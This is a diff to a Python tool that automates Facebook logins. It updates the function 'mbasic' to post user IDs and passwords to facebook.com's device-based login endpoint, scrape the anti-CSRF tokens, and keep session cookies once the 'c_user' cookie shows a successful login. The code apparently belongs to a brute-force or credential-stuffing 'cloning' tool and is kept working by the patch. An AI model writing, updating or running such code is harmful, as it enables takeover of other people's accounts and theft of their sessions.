@@ -1290,28 +1290,38 @@ def mbasic(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text 
             data = {
-            'jazoest': '22573',
-            'lsd': 'AdRgt4koDfzsyLx4lemq3YoEQrs',
-            'initial_request_id': 'AEHCUM04_Zp0_gpMju5M1F8',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODUyLCJjIjoyNH0=',
-            'lgnrnd': '000506_syDu',
-            'lgnjs': 'n',
             'email': uid,
-            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'default_persistent': '',}
+            'cuid': '',
+            'guid': 'faa103789f97529c8',
+            'lgnjs': '1787658135',
+            'lgnrnd': '044214_ASNK',
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/facebook/',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODUyLCJjIjoyNH0=',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+            'seo_visit_from_session': '1',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'DTiNaqX1AXorpHDezRNgATu3',
-            'wd': '1440x459',
-            'sb': 'ITiNam5PFZlCIwvurO_AST3s',}
+            'datr': '592Daq2rp5gLNRazYdOXGM2e',
+            'sb': '592DarL1cKcXxzcPcDHdsFA6',
+            'wd': '1440x501',
+            'ps_l': '1',
+            'ps_n': '1',
+            'locale': 'en_GB',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Referer': 'https://www.messenger.com/',
+            'Referer': 'https://www.facebook.com/facebook/',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.messenger.com',
-            'Alt-Used': 'www.messenger.com',
+            'Origin': 'https://www.facebook.com',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
@@ -1320,7 +1330,7 @@ def mbasic(uid,pwx,tl):
             'Sec-Fetch-User': '?1',
             'Priority': 'u=0, i',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            po = Session.post('https://www.messenger.com/login/password/', cookies=cookies, headers=headers, data=data).text
+            po = Session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1', cookies=cookies, headers=headers, data=data).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
